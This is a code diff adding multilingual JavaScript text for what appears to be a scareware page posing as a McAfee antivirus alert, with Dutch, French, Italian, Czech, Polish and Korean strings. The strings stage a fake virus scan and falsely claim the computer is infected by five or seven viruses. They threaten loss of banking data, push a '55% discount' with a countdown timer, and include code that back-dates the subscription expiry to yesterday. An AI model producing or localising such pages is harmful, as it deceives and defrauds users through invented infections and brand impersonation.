+document.getElementById('w6_007').innerHTML = 'Aanbieding vervalt in:';
+document.getElementById('w6_008').innerHTML = 'Minuten';
+document.getElementById('w6_009').innerHTML = 'Seconden';
+document.getElementById('w6_010').innerHTML = 'Nu vernieuwen';
+
+document.getElementById('risk').innerHTML = 'Risico';
+document.getElementById('high').innerHTML = 'Hoog';
+document.getElementById('origin').innerHTML = 'Bron';
+document.getElementById('notavl').innerHTML = 'Niet beschikbaar';
+document.getElementById('actvty').innerHTML = 'Activiteit';
+document.getElementById('thretaction').innerHTML = 'Bedreigingsacties uitgevoerd: 1';
+document.getElementById('risk2').innerHTML = 'Risico';
+document.getElementById('high2').innerHTML = 'Hoog';
+document.getElementById('origin2').innerHTML = 'Bron';
+document.getElementById('notavl2').innerHTML = 'Niet beschikbaar';
+document.getElementById('actvty2').innerHTML = 'Activiteit';
+document.getElementById('thretaction2').innerHTML = 'Bedreigingsacties uitgevoerd: 1';
+document.getElementById('risk3').innerHTML = 'Risico';
+document.getElementById('high3').innerHTML = 'Hoog';
+document.getElementById('origin3').innerHTML = 'Bron';
+document.getElementById('notavl3').innerHTML = 'Niet beschikbaar';
+document.getElementById('actvty3').innerHTML = 'Activiteit';
+document.getElementById('thretaction3').innerHTML = 'Bedreigingsacties uitgevoerd: 1';
+}
+
+// French (FR)
+if (lang == 'fr') {
+document.getElementById('w1_001').innerHTML = "Avertissement de sécurité - Infection potentielle par un virus";
+document.getElementById('w1_003').innerHTML = "Vous avez peut-être visité des sites web dangereux avec du contenu malveillant";
+document.getElementById('w1_004').innerHTML = "Votre PC risque d'être infecté par des virus";
+document.getElementById('w1_005').innerHTML = "Pour continuer à naviguer en toute sécurité - effectuez une analyse antivirus";
+document.getElementById('w1_006').innerHTML = "Exécuter une analyse rapide";
+
+document.getElementById('w1_3').innerHTML = 'Vous êtes protégé';
+document.getElementById('w1_4').innerHTML = 'Mises à jour de protection:';
+document.getElementById('w1_5').innerHTML = 'Actuel';
+document.getElementById('w1_6').innerHTML = 'Dernière analyse:';
+document.getElementById('w1_7').innerHTML = 'Non disponible';
+document.getElementById('w1_8').innerHTML = 'Exécuter une analyse rapide';
+document.getElementById('w1_9').innerHTML = 'Licence utilisée:';
+document.getElementById('w1_10').innerHTML = '1 sur 5';
+document.getElementById('w1_11').innerHTML = 'Installer sur un autre appareil';
+document.getElementById('w1_12').innerHTML = 'Système';
+document.getElementById('w1_13').innerHTML = 'Protégé';
+document.getElementById('w1_14').innerHTML = 'Navigateurs';
+document.getElementById('w1_13a').innerHTML = 'Protégé';
+document.getElementById('w1_15').innerHTML = 'Performance';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'Fichiers';
+document.getElementById('w1_13d').innerHTML = 'Documents';
+document.getElementById('w1_13b').innerHTML = 'Protégé';
+document.getElementById('w1_16').innerHTML = 'Plus de McAfee';
+document.getElementById('w1_16a').innerHTML = 'Visiter le site web';
+document.getElementById('w1_13c').innerHTML = 'Protégé';
+document.getElementById('w1_17').innerHTML = 'Statut de l\'abonnement:';
+document.getElementById('w1_18').innerHTML = '30 jours restants';
+
+document.getElementById('w2_1').innerHTML = 'Analyse rapide';
+document.getElementById('w2_2').innerHTML = 'Analyse en cours...';
+document.getElementById('w2_2b').innerHTML = 'Virus et logiciels malveillants';
+document.getElementById('w2_3').innerHTML = 'Analyse des zones couramment infectées et des fichiers de démarrage...';
+document.getElementById('w2_6').innerHTML = 'Résultats de l\'analyse';
+document.getElementById('w2_7').innerHTML = '[+] Total des éléments analysés:';
+document.getElementById('w2_8').innerHTML = '[+] Total des risques de sécurité détectés:';
+document.getElementById('w2_9').innerHTML = '[+] Total des risques de sécurité résolus:';
+document.getElementById('w2_9b').innerHTML = 'Résumé des résultats';
+document.getElementById('w2_11').innerHTML = 'Pause';
+document.getElementById('w2_12').innerHTML = 'Arrêter';
+
+document.getElementById('w3_1').innerHTML = 'Votre ordinateur est infecté par (5) virus!';
+document.getElementById('w3_2').innerHTML = 'Mettez à jour maintenant pour protéger votre PC.';
+document.getElementById('w3_3').innerHTML = 'Sans protection, votre PC est vulnérable aux virus et autres menaces de logiciels malveillants.';
+document.getElementById('w3_6').innerHTML = 'Continuer…';
+
+document.getElementById('w5_001').innerHTML = 'En cours : Veuillez ne pas fermer';
+document.getElementById('w5_001a').innerHTML = 'Réparation en cours...';
+document.getElementById('w5_002').innerHTML = 'Sélection des zones et fichiers infectés...';
+document.getElementById('w5_003').innerHTML = 'Zones et fichiers sélectionnés isolés...';
+document.getElementById('w5_004').innerHTML = 'Vérification des autorisations du système';
+document.getElementById('w5_005').innerHTML = 'Vérification du statut du système...';
+document.getElementById('w5_006').innerHTML = 'Vérification du statut de l\'abonnement McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pause';
+document.getElementById('w5_008').innerHTML = 'Arrêter';
+
+document.getElementById('w6_000').innerHTML = 'Avertissement! Votre protection antivirus n\'est pas activée!';
+document.getElementById('w6_001').innerHTML = 'Virus identifiés:';
+document.getElementById('w6_003').innerHTML = 'Votre protection antivirus a expiré<br>Le';
+document.getElementById('w6_004').innerHTML = 'Étant donné que votre ordinateur est potentiellement infecté par (7) virus différents, il est essentiel de renouveler votre logiciel antivirus pour protéger vos informations personnelles, prévenir d\'autres dommages et restaurer l\'intégrité et la sécurité de votre système. Ignorer le renouvellement de l\'antivirus entraînera la perte de vos coordonnées bancaires, de vos informations personnelles et d\'autres informations précieuses de votre ordinateur.';
+document.getElementById('w6_005').innerHTML = 'Sans protection, votre ordinateur est à risque de virus et autres logiciels malveillants.';
+document.getElementById('w6_006').innerHTML = '55% de réduction!';
+document.getElementById('w6_007').innerHTML = 'Offre expire dans:';
+document.getElementById('w6_008').innerHTML = 'Minutes';
+document.getElementById('w6_009').innerHTML = 'Secondes';
+document.getElementById('w6_010').innerHTML = 'Renouveler maintenant';
+
+document.getElementById('risk').innerHTML = 'Risque';
+document.getElementById('high').innerHTML = 'Élevé';
+document.getElementById('origin').innerHTML = 'Source';
+document.getElementById('notavl').innerHTML = 'Indisponible';
+document.getElementById('actvty').innerHTML = 'Activité';
+document.getElementById('thretaction').innerHTML = 'Actions contre les menaces exécutées: 1';
+document.getElementById('risk2').innerHTML = 'Risque';
+document.getElementById('high2').innerHTML = 'Élevé';
+document.getElementById('origin2').innerHTML = 'Source';
+document.getElementById('notavl2').innerHTML = 'Indisponible';
+document.getElementById('actvty2').innerHTML = 'Activité';
+document.getElementById('thretaction2').innerHTML = 'Actions contre les menaces exécutées: 1';
+document.getElementById('risk3').innerHTML = 'Risque';
+document.getElementById('high3').innerHTML = 'Élevé';
+document.getElementById('origin3').innerHTML = 'Source';
+document.getElementById('notavl3').innerHTML = 'Indisponible';
+document.getElementById('actvty3').innerHTML = 'Activité';
+document.getElementById('thretaction3').innerHTML = 'Actions contre les menaces exécutées: 1';
+}
+
+// Italian (IT)
+if (lang == 'it') {
+document.getElementById('w1_001').innerHTML = "Avviso di sicurezza - Infezione potenziale da virus";
+document.getElementById('w1_003').innerHTML = "Potresti aver visitato siti web non sicuri con contenuti dannosi";
+document.getElementById('w1_004').innerHTML = "Il tuo PC è a rischio di essere infettato da virus";
+document.getElementById('w1_005').innerHTML = "Per continuare a navigare in sicurezza - esegui una scansione antivirus";
+document.getElementById('w1_006').innerHTML = "Esegui scansione rapida";
+
+document.getElementById('w1_3').innerHTML = 'Sei protetto';
+document.getElementById('w1_4').innerHTML = 'Aggiornamenti di protezione:';
+document.getElementById('w1_5').innerHTML = 'Attuale';
+document.getElementById('w1_6').innerHTML = 'Ultima scansione:';
+document.getElementById('w1_7').innerHTML = 'Non disponibile';
+document.getElementById('w1_8').innerHTML = 'Esegui scansione rapida';
+document.getElementById('w1_9').innerHTML = 'Licenza utilizzata:';
+document.getElementById('w1_10').innerHTML = '1 di 5';
+document.getElementById('w1_11').innerHTML = 'Installa su un altro dispositivo';
+document.getElementById('w1_12').innerHTML = 'Sistema';
+document.getElementById('w1_13').innerHTML = 'Protetto';
+document.getElementById('w1_14').innerHTML = 'Browser';
+document.getElementById('w1_13a').innerHTML = 'Protetto';
+document.getElementById('w1_15').innerHTML = 'Performance';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'File';
+document.getElementById('w1_13d').innerHTML = 'Documenti';
+document.getElementById('w1_13b').innerHTML = 'Protetto';
+document.getElementById('w1_16').innerHTML = 'Più McAfee';
+document.getElementById('w1_16a').innerHTML = 'Visita il sito web';
+document.getElementById('w1_13c').innerHTML = 'Protetto';
+document.getElementById('w1_17').innerHTML = 'Stato dell\'abbonamento:';
+document.getElementById('w1_18').innerHTML = '30 giorni rimanenti';
+
+document.getElementById('w2_1').innerHTML = 'Scansione rapida';
+document.getElementById('w2_2').innerHTML = 'Scansione in corso...';
+document.getElementById('w2_2b').innerHTML = 'Virus e malware';
+document.getElementById('w2_3').innerHTML = 'Scansione delle aree comunemente infette e dei file di avvio...';
+document.getElementById('w2_6').innerHTML = 'Risultati della scansione';
+document.getElementById('w2_7').innerHTML = '[+] Elementi totali scansionati:';
+document.getElementById('w2_8').innerHTML = '[+] Rischi di sicurezza totali rilevati:';
+document.getElementById('w2_9').innerHTML = '[+] Rischi di sicurezza totali risolti:';
+document.getElementById('w2_9b').innerHTML = 'Riepilogo dei risultati';
+document.getElementById('w2_11').innerHTML = 'Pausa';
+document.getElementById('w2_12').innerHTML = 'Ferma';
+
+document.getElementById('w3_1').innerHTML = 'Il tuo computer è infetto da (5) virus!';
+document.getElementById('w3_2').innerHTML = 'Aggiorna ora per proteggere il tuo PC.';
+document.getElementById('w3_3').innerHTML = 'Senza protezione, il tuo PC è vulnerabile a virus e altre minacce di malware.';
+document.getElementById('w3_6').innerHTML = 'Continua…';
+
+document.getElementById('w5_001').innerHTML = 'In corso: per favore non chiudere';
+document.getElementById('w5_001a').innerHTML = 'Riparazione in corso...';
+document.getElementById('w5_002').innerHTML = 'Selezione delle aree e dei file infetti...';
+document.getElementById('w5_003').innerHTML = 'Aree e file selezionati isolati...';
+document.getElementById('w5_004').innerHTML = 'Controllo dei permessi del sistema';
+document.getElementById('w5_005').innerHTML = 'Controllo dello stato del sistema...';
+document.getElementById('w5_006').innerHTML = 'Controllo dello stato dell\'abbonamento McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pausa';
+document.getElementById('w5_008').innerHTML = 'Ferma';
+
+document.getElementById('w6_000').innerHTML = 'Attenzione! La tua protezione antivirus non è attivata!';
+document.getElementById('w6_001').innerHTML = 'Virus identificati:';
+document.getElementById('w6_003').innerHTML = 'La tua protezione antivirus è scaduta<br>Il';
+document.getElementById('w6_004').innerHTML = 'Dato che il tuo computer è potenzialmente infettato da (7) virus diversi, rinnovare il tuo software antivirus è essenziale per proteggere le tue informazioni personali, prevenire ulteriori danni e ripristinare l\'integrità e la sicurezza del tuo sistema. Ignorare il rinnovo dell\'antivirus comporterà la perdita di dati bancari, informazioni personali e altre informazioni preziose dal tuo computer.';
+document.getElementById('w6_005').innerHTML = 'Senza protezione, il tuo computer è a rischio di virus e altri malware.';
+document.getElementById('w6_006').innerHTML = 'Sconto del 55%!';
+document.getElementById('w6_007').innerHTML = 'Offerta scade in:';
+document.getElementById('w6_008').innerHTML = 'Minuti';
+document.getElementById('w6_009').innerHTML = 'Secondi';
+document.getElementById('w6_010').innerHTML = 'Rinnova ora';
+
+document.getElementById('risk').innerHTML = 'Rischio';
+document.getElementById('high').innerHTML = 'Alto';
+document.getElementById('origin').innerHTML = 'Fonte';
+document.getElementById('notavl').innerHTML = 'Non disponibile';
+document.getElementById('actvty').innerHTML = 'Attività';
+document.getElementById('thretaction').innerHTML = 'Azioni contro le minacce eseguite: 1';
+document.getElementById('risk2').innerHTML = 'Rischio';
+document.getElementById('high2').innerHTML = 'Alto';
+document.getElementById('origin2').innerHTML = 'Fonte';
+document.getElementById('notavl2').innerHTML = 'Non disponibile';
+document.getElementById('actvty2').innerHTML = 'Attività';
+document.getElementById('thretaction2').innerHTML = 'Azioni contro le minacce eseguite: 1';
+document.getElementById('risk3').innerHTML = 'Rischio';
+document.getElementById('high3').innerHTML = 'Alto';
+document.getElementById('origin3').innerHTML = 'Fonte';
+document.getElementById('notavl3').innerHTML = 'Non disponibile';
+document.getElementById('actvty3').innerHTML = 'Attività';
+document.getElementById('thretaction3').innerHTML = 'Azioni contro le minacce eseguite: 1';
+}
+
+// Czech (CS/CZ)
+if (lang == 'cs' || lang == 'cz') {
+document.getElementById('w1_001').innerHTML = "Bezpečnostní varování - Možná virová infekce";
+document.getElementById('w1_003').innerHTML = "Možná jste navštívili nebezpečné webové stránky s škodlivým obsahem";
+document.getElementById('w1_004').innerHTML = "Váš počítač je ohrožen infekcí virem";
+document.getElementById('w1_005').innerHTML = "Pro bezpečné procházení proveďte antivirovou kontrolu";
+document.getElementById('w1_006').innerHTML = "Spustit rychlou kontrolu";
+
+document.getElementById('w1_3').innerHTML = 'Jste chráněni';
+document.getElementById('w1_4').innerHTML = 'Aktualizace ochrany:';
+document.getElementById('w1_5').innerHTML = 'Aktuální';
+document.getElementById('w1_6').innerHTML = 'Poslední kontrola:';
+document.getElementById('w1_7').innerHTML = 'Není k dispozici';
+document.getElementById('w1_8').innerHTML = 'Spustit rychlou kontrolu';
+document.getElementById('w1_9').innerHTML = 'Použitá licence:';
+document.getElementById('w1_10').innerHTML = '1 z 5';
+document.getElementById('w1_11').innerHTML = 'Nainstalovat na jiné zařízení';
+document.getElementById('w1_12').innerHTML = 'Systém';
+document.getElementById('w1_13').innerHTML = 'Chráněno';
+document.getElementById('w1_14').innerHTML = 'Prohlížeče';
+document.getElementById('w1_13a').innerHTML = 'Chráněno';
+document.getElementById('w1_15').innerHTML = 'Výkon';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'Soubory';
+document.getElementById('w1_13d').innerHTML = 'Dokumenty';
+document.getElementById('w1_13b').innerHTML = 'Chráněno';
+document.getElementById('w1_16').innerHTML = 'Více McAfee';
+document.getElementById('w1_16a').innerHTML = 'Navštívit webovou stránku';
+document.getElementById('w1_13c').innerHTML = 'Chráněno';
+document.getElementById('w1_17').innerHTML = 'Stav předplatného:';
+document.getElementById('w1_18').innerHTML = 'Zbývá 30 dní';
+
+document.getElementById('w2_1').innerHTML = 'Rychlá kontrola';
+document.getElementById('w2_2').innerHTML = 'Kontrolování...';
+document.getElementById('w2_2b').innerHTML = 'Viry a malware';
+document.getElementById('w2_3').innerHTML = 'Kontrolování běžně infikovaných oblastí a startovních souborů...';
+document.getElementById('w2_6').innerHTML = 'Výsledky kontroly';
+document.getElementById('w2_7').innerHTML = '[+] Celkem zkontrolovaných položek:';
+document.getElementById('w2_8').innerHTML = '[+] Celkem zjištěných bezpečnostních rizik:';
+document.getElementById('w2_9').innerHTML = '[+] Celkem vyřešených bezpečnostních rizik:';
+document.getElementById('w2_9b').innerHTML = 'Přehled výsledků';
+document.getElementById('w2_11').innerHTML = 'Pauza';
+document.getElementById('w2_12').innerHTML = 'Zastavit';
+
+document.getElementById('w3_1').innerHTML = 'Váš počítač je infikován (5) viry!';
+document.getElementById('w3_2').innerHTML = 'Aktualizujte nyní, abyste ochránili svůj PC.';
+document.getElementById('w3_3').innerHTML = 'Bez ochrany je váš počítač náchylný k virům a jiným hrozbám malwaru.';
+document.getElementById('w3_6').innerHTML = 'Pokračovat…';
+
+document.getElementById('w5_001').innerHTML = 'Probíhá: prosím nezavírejte';
+document.getElementById('w5_001a').innerHTML = 'Probíhá oprava...';
+document.getElementById('w5_002').innerHTML = 'Výběr infikovaných oblastí a souborů...';
+document.getElementById('w5_003').innerHTML = 'Vybrané oblasti a soubory izolovány...';
+document.getElementById('w5_004').innerHTML = 'Kontrola systémových oprávnění';
+document.getElementById('w5_005').innerHTML = 'Kontrola stavu systému...';
+document.getElementById('w5_006').innerHTML = 'Kontrola stavu předplatného McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pauza';
+document.getElementById('w5_008').innerHTML = 'Zastavit';
+
+document.getElementById('w6_000').innerHTML = 'Varování! Vaše antivirusová ochrana není aktivována!';
+document.getElementById('w6_001').innerHTML = 'Identifikované viry:';
+document.getElementById('w6_003').innerHTML = 'Vaše antivirusová ochrana vypršela<br>Dne';
+document.getElementById('w6_004').innerHTML = 'Vzhledem k tomu, že váš počítač je potenciálně infikován (7) různými viry, je zásadní obnovit váš antivirový software, abyste chránili své osobní údaje, zabránili dalším škodám a obnovili integritu a bezpečnost vašeho systému. Ignorování obnovy antiviru povede ke ztrátě bankovních údajů, osobních informací a dalších cenných údajů z vašeho počítače.';
+document.getElementById('w6_005').innerHTML = 'Bez ochrany je váš počítač ohrožen viry a jinými malware.';
+document.getElementById('w6_006').innerHTML = 'Sleva 55%!';
+document.getElementById('w6_007').innerHTML = 'Nabídka vyprší za:';
+document.getElementById('w6_008').innerHTML = 'Minuty';
+document.getElementById('w6_009').innerHTML = 'Sekundy';
+document.getElementById('w6_010').innerHTML = 'Obnovit nyní';
+
+document.getElementById('risk').innerHTML = 'Riziko';
+document.getElementById('high').innerHTML = 'Vysoké';
+document.getElementById('origin').innerHTML = 'Zdroj';
+document.getElementById('notavl').innerHTML = 'Nedostupné';
+document.getElementById('actvty').innerHTML = 'Aktivita';
+document.getElementById('thretaction').innerHTML = 'Provedené akce proti hrozbám: 1';
+document.getElementById('risk2').innerHTML = 'Riziko';
+document.getElementById('high2').innerHTML = 'Vysoké';
+document.getElementById('origin2').innerHTML = 'Zdroj';
+document.getElementById('notavl2').innerHTML = 'Nedostupné';
+document.getElementById('actvty2').innerHTML = 'Aktivita';
+document.getElementById('thretaction2').innerHTML = 'Provedené akce proti hrozbám: 1';
+document.getElementById('risk3').innerHTML = 'Riziko';
+document.getElementById('high3').innerHTML = 'Vysoké';
+document.getElementById('origin3').innerHTML = 'Zdroj';
+document.getElementById('notavl3').innerHTML = 'Nedostupné';
+document.getElementById('actvty3').innerHTML = 'Aktivita';
+document.getElementById('thretaction3').innerHTML = 'Provedené akce proti hrozbám: 1';
+}
+
+// Polish
+if (lang == 'pl') {
+document.getElementById('w1_001').innerHTML = "Ostrzeżenie o bezpieczeństwie - Potencjalna infekcja wirusem";
+document.getElementById('w1_003').innerHTML = "Mogłeś odwiedzić niebezpieczne strony internetowe zawierające złośliwe treści";
+document.getElementById('w1_004').innerHTML = "Twój komputer jest narażony na infekcje wirusami";
+document.getElementById('w1_005').innerHTML = "Aby kontynuować bezpieczne przeglądanie - wykonaj skanowanie antywirusowe";
+document.getElementById('w1_006').innerHTML = "Uruchom szybkie skanowanie";	
+
+document.getElementById('w1_3').innerHTML = 'Jesteś chroniony';
+document.getElementById('w1_4').innerHTML = 'Aktualizacje ochrony:';
+document.getElementById('w1_5').innerHTML = 'Aktualne';
+document.getElementById('w1_6').innerHTML = 'Ostatnie skanowanie:';
+document.getElementById('w1_7').innerHTML = 'Niedostępne';
+document.getElementById('w1_8').innerHTML = 'Uruchom szybkie skanowanie';
+document.getElementById('w1_9').innerHTML = 'Wykorzystane licencje:';
+document.getElementById('w1_10').innerHTML = '1 z 5';
+document.getElementById('w1_11').innerHTML = 'Zainstaluj na innym urządzeniu';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Chroniony';
+document.getElementById('w1_14').innerHTML = 'Przeglądarki';
+document.getElementById('w1_13a').innerHTML = 'Chroniony';
+document.getElementById('w1_15').innerHTML = 'Wydajność';
+document.getElementById('w1_15a').innerHTML = 'Chmura';
+document.getElementById('w1_15b').innerHTML = 'Pliki';
+document.getElementById('w1_13d').innerHTML = 'Dokumenty';
+document.getElementById('w1_13b').innerHTML = 'Chroniony';
+document.getElementById('w1_16').innerHTML = 'Więcej McAfee';
+document.getElementById('w1_16a').innerHTML = 'Odwiedź stronę';
+document.getElementById('w1_13c').innerHTML = 'Chroniony';
+document.getElementById('w1_17').innerHTML = 'Status subskrypcji:';
+document.getElementById('w1_18').innerHTML = 'Pozostało 30 dni';
+
+document.getElementById('w2_1').innerHTML = 'Szybkie skanowanie';
+document.getElementById('w2_2').innerHTML = 'Skanowanie...';
+document.getElementById('w2_2b').innerHTML = 'Wirusy i malware';
+document.getElementById('w2_3').innerHTML = 'Skanowanie często infekowanych obszarów i plików startowych...';
+document.getElementById('w2_6').innerHTML = 'Wyniki skanowania';
+document.getElementById('w2_7').innerHTML = '[+] Łączna liczba przeskanowanych elementów:';
+document.getElementById('w2_8').innerHTML = '[+] Łączna liczba wykrytych zagrożeń bezpieczeństwa:';
+document.getElementById('w2_9').innerHTML = '[+] Łączna liczba usuniętych zagrożeń bezpieczeństwa:';
+document.getElementById('w2_9b').innerHTML = 'Podsumowanie wyników';
+document.getElementById('w2_11').innerHTML = 'Pauza';
+document.getElementById('w2_12').innerHTML = 'Stop';
+
+document.getElementById('w3_1').innerHTML = 'Twój komputer jest zainfekowany (5) wirusami!';
+document.getElementById('w3_2').innerHTML = 'Zaktualizuj teraz, aby chronić swój komputer.';
+document.getElementById('w3_3').innerHTML = 'Bez ochrony, Twój komputer jest narażony na wirusy i inne zagrożenia malware.';
+document.getElementById('w3_6').innerHTML = 'Kontynuuj...';
+
+document.getElementById('w5_001').innerHTML = 'W trakcie: Proszę nie zamykać';
+document.getElementById('w5_001a').innerHTML = 'Naprawa w toku...';
+document.getElementById('w5_002').innerHTML = 'Wybieranie zainfekowanych obszarów i plików...';
+document.getElementById('w5_003').innerHTML = 'Wybrane obszary i pliki odizolowane...';
+document.getElementById('w5_004').innerHTML = 'Sprawdzanie uprawnień systemowych';
+document.getElementById('w5_005').innerHTML = 'Sprawdzanie stanu systemu...';
+document.getElementById('w5_006').innerHTML = 'Sprawdzanie stanu subskrypcji McAfee...';
+document.getElementById('w5_007').innerHTML = 'Pauza';
+document.getElementById('w5_008').innerHTML = 'Stop';
+
+document.getElementById('w6_000').innerHTML = 'Ostrzeżenie! Twoja ochrona antywirusowa nie jest aktywowana!';
+document.getElementById('w6_001').innerHTML = 'Zidentyfikowane wirusy::';
+document.getElementById('w6_003').innerHTML = 'Twoja ochrona antywirusowa wygasła<br> dnia';
+document.getElementById('w6_004').innerHTML = 'Biorąc pod uwagę, że Twój komputer jest potencjalnie zainfekowany (7) różnymi wirusami, odnowienie oprogramowania antywirusowego jest niezbędne do ochrony Twoich danych osobowych, zapobiegania dalszym szkodom oraz przywrócenia integralności i bezpieczeństwa systemu. Ignorowanie odnowienia antywirusa skutkować będzie utratą danych bankowych, danych osobowych i innych cennych informacji z Twojego komputera.';
+document.getElementById('w6_005').innerHTML = 'Bez ochrony, Twój komputer jest narażony na wirusy i inne zagrożenia malware.';
+document.getElementById('w6_006').innerHTML = 'Zniżka 55%!';
+document.getElementById('w6_007').innerHTML = 'Oferta wygasa za:';
+document.getElementById('w6_008').innerHTML = 'Minuty';
+document.getElementById('w6_009').innerHTML = 'Sekundy';
+document.getElementById('w6_010').innerHTML = 'Odnów teraz';
+
+document.getElementById('risk').innerHTML = 'Ryzyko';
+document.getElementById('high').innerHTML = 'Wysokie';
+document.getElementById('origin').innerHTML = 'Źródło';
+document.getElementById('notavl').innerHTML = 'Niedostępne';
+document.getElementById('actvty').innerHTML = 'Aktywność';
+document.getElementById('thretaction').innerHTML = 'Podjęte działania zagrożeń: 1';
+document.getElementById('risk2').innerHTML = 'Ryzyko';
+document.getElementById('high2').innerHTML = 'Wysokie';
+document.getElementById('origin2').innerHTML = 'Źródło';
+document.getElementById('notavl2').innerHTML = 'Niedostępne';
+document.getElementById('actvty2').innerHTML = 'Aktywność';
+document.getElementById('thretaction2').innerHTML = 'Podjęte działania zagrożeń: 1';
+document.getElementById('risk3').innerHTML = 'Ryzyko';
+document.getElementById('high3').innerHTML = 'Wysokie';
+document.getElementById('origin3').innerHTML = 'Źródło';
+document.getElementById('notavl3').innerHTML = 'Niedostępne';
+document.getElementById('actvty3').innerHTML = 'Aktywność';
+document.getElementById('thretaction3').innerHTML = 'Podjęte działania zagrożeń: 1';
+}
+
+// Korean
+if (lang == 'ko' || lang == 'kr') {
+document.getElementById('w1_001').innerHTML = "보안 경고 - 바이러스 감염 가능성";
+document.getElementById('w1_003').innerHTML = "악성 콘텐츠가 있는 안전하지 않은 웹사이트를 방문했을 수 있습니다";
+document.getElementById('w1_004').innerHTML = "PC가 바이러스에 감염될 위험이 있습니다";
+document.getElementById('w1_005').innerHTML = "안전하게 계속 탐색하려면 - 안티바이러스 검사를 수행하십시오";
+document.getElementById('w1_006').innerHTML = "빠른 검사 실행";
+
+document.getElementById('w1_3').innerHTML = '보호되고 있습니다';
+document.getElementById('w1_4').innerHTML = '보호 업데이트:';
+document.getElementById('w1_5').innerHTML = '현재';
+document.getElementById('w1_6').innerHTML = '마지막 검사:';
+document.getElementById('w1_7').innerHTML = '사용 불가';
+document.getElementById('w1_8').innerHTML = '빠른 검사 실행';
+document.getElementById('w1_9').innerHTML = '사용된 라이선스:';
+document.getElementById('w1_10').innerHTML = '1 / 5';
+document.getElementById('w1_11').innerHTML = '다른 장치에 설치';
+document.getElementById('w1_12').innerHTML = '시스템';
+document.getElementById('w1_13').innerHTML = '보호됨';
+document.getElementById('w1_14').innerHTML = '브라우저';
+document.getElementById('w1_13a').innerHTML = '보호됨';
+document.getElementById('w1_15').innerHTML = '성능';
+document.getElementById('w1_15a').innerHTML = '클라우드';
+document.getElementById('w1_15b').innerHTML = '파일';
+document.getElementById('w1_13d').innerHTML = '문서';
+document.getElementById('w1_13b').innerHTML = '보호됨';
+document.getElementById('w1_16').innerHTML = '추가 McAfee';
+document.getElementById('w1_16a').innerHTML = '웹사이트 방문';
+document.getElementById('w1_13c').innerHTML = '보호됨';
+document.getElementById('w1_17').innerHTML = '구독 상태:';
+document.getElementById('w1_18').innerHTML = '30일 남음';
+
+document.getElementById('w2_1').innerHTML = '빠른 검사';
+document.getElementById('w2_2').innerHTML = '검사 중...';
+document.getElementById('w2_2b').innerHTML = '바이러스 및 악성 소프트웨어';
+document.getElementById('w2_3').innerHTML = '감염이 자주 발생하는 영역 및 시작 파일 검사 중...';
+document.getElementById('w2_6').innerHTML = '검사 결과';
+document.getElementById('w2_7').innerHTML = '[+] 검사된 총 항목:';
+document.getElementById('w2_8').innerHTML = '[+] 감지된 총 보안 위험:';
+document.getElementById('w2_9').innerHTML = '[+] 해결된 총 보안 위험:';
+document.getElementById('w2_9b').innerHTML = '결과 요약';
+document.getElementById('w2_11').innerHTML = '일시 중지';
+document.getElementById('w2_12').innerHTML = '중지';
+
+document.getElementById('w3_1').innerHTML = '귀하의 컴퓨터에 (5)개의 바이러스가 감염되었습니다!';
+document.getElementById('w3_2').innerHTML = 'PC를 보호하려면 지금 업데이트하십시오.';
+document.getElementById('w3_3').innerHTML = '보호 없이 PC는 바이러스 및 기타 악성 소프트웨어 위협에 취약합니다.';
+document.getElementById('w3_6').innerHTML = '계속...';
+
+document.getElementById('w5_001').innerHTML = '진행 중: 닫지 마십시오';
+document.getElementById('w5_001a').innerHTML = '수리 진행 중...';
+document.getElementById('w5_002').innerHTML = '감염된 영역 및 파일 선택 중...';
+document.getElementById('w5_003').innerHTML = '선택된 영역 및 파일 격리됨...';
+document.getElementById('w5_004').innerHTML = '시스템 권한 확인 중';
+document.getElementById('w5_005').innerHTML = '시스템 상태 확인 중...';
+document.getElementById('w5_006').innerHTML = 'McAfee 구독 상태 확인 중...';
+document.getElementById('w5_007').innerHTML = '일시 중지';
+document.getElementById('w5_008').innerHTML = '중지';
+
+document.getElementById('w6_000').innerHTML = '경고! 안티바이러스 보호가 활성화되지 않았습니다!';
+document.getElementById('w6_001').innerHTML = '식별된 바이러스:';
+document.getElementById('w6_003').innerHTML = '안티바이러스 보호가 만료되었습니다<br> 날짜';
+document.getElementById('w6_004').innerHTML = '귀하의 컴퓨터가 (7)개의 다른 바이러스에 감염될 가능성이 있기 때문에, 안티바이러스 소프트웨어를 갱신하는 것은 개인 정보 보호, 추가 피해 방지, 시스템의 무결성 및 보안을 복원하는 데 필수적입니다. 안티바이러스 갱신을 무시하면 은행 정보, 개인 정보 및 기타 귀중한 정보 손실로 이어질 수 있습니다.';
+document.getElementById('w6_005').innerHTML = '보호 없이 컴퓨터는 바이러스 및 기타 악성 소프트웨어에 취약합니다.';
+document.getElementById('w6_006').innerHTML = '55% 할인!';
+document.getElementById('w6_007').innerHTML = '제안 만료까지:';
+document.getElementById('w6_008').innerHTML = '분';
+document.getElementById('w6_009').innerHTML = '초';
+document.getElementById('w6_010').innerHTML = '지금 갱신';
+
+document.getElementById('risk').innerHTML = '위험';
+document.getElementById('high').innerHTML = '높음';
+document.getElementById('origin').innerHTML = '출처';
+document.getElementById('notavl').innerHTML = '사용 불가';
+document.getElementById('actvty').innerHTML = '활동';
+document.getElementById('thretaction').innerHTML = '실행된 위협 조치: 1';
+document.getElementById('risk2').innerHTML = '위험';
+document.getElementById('high2').innerHTML = '높음';
+document.getElementById('origin2').innerHTML = '출처';
+document.getElementById('notavl2').innerHTML = '사용 불가';
+document.getElementById('actvty2').innerHTML = '활동';
+document.getElementById('thretaction2').innerHTML = '실행된 위협 조치: 1';
+document.getElementById('risk3').innerHTML = '위험';
+document.getElementById('high3').innerHTML = '높음';
+document.getElementById('origin3').innerHTML = '출처';
+document.getElementById('notavl3').innerHTML = '사용 불가';
+document.getElementById('actvty3').innerHTML = '활동';
+document.getElementById('thretaction3').innerHTML = '실행된 위협 조치: 1';
+}
+
+
+
+//exp date
+var date = new Date();
+date.setDate(date.getDate() - 1);
+var d = date.getDate();
+var m = date.getMonth() + 1;
+var y = date.getFullYear();
+			
+var options = {
+    year: 'numeric',
+    month: 'long',
+    day: '2-digit'
+};
+
